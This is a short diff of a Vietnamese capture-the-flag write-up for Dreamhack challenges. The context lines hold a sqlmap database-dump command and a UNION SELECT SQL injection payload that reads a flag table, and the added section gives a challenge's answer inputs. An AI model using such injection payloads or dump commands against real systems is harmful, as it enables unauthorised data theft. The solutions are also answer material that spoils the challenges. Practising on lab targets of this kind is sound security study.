@@ -141,3 +141,8 @@ leg=FlAG
 ```sqlmap -u http://host3.dreamhack.games:24120/ --data "uid=a&upw=a" --dump```
 - hoặc
 ```uid='+UNION+SELECT+sflag,+sclose,sname+,+svalue+FROM+onlyflag--+-&upw=a```
+
+### Type c-j
+- Nếu m đọc tới đây, thì t biết là m đã bất lực.
+- Tin t đi không làm ra đâu.
+  ```input1=0000000000&input2=356abcde```
